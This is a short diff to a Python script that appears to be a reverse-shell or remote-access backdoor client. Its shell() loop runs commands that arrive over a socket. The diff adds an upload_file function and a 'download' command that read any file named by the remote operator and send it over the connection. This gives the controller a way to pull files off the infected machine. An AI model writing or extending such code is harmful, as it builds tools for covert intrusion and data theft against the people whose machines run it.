@@ -19,6 +19,11 @@ def reliable_recv():
             continue
 
 
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    s.send(f.read())
+
+
 def download_file(file_name):
     f = open(file_name, 'wb')
     s.settimeout(1)
@@ -46,6 +51,8 @@ def shell():
             os.chdir(command[3:])
         elif command[:6] == 'upload':
             download_file(command[7:])
+        elif command[:8] == 'download':
+            upload_file(command[9:])
         else:
             if command == 'pwd':
                 if os.name == 'nt':
